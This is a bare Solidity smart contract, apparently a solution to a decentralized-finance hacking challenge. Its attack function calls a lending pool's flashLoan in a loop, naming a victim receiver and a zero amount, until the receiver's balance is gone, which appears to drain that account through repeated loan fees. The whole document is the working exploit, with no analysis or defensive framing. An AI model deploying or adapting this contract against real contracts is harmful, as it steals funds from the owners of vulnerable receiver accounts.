pragma solidity ^0.6.0;

contract AttackReceiver {
    function attack(address payable pool, address payable receiver) public {
        while(receiver.balance > 0) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    receiver,
                    0
                )
            );
            require(success, "External call failed");
        }
    }

}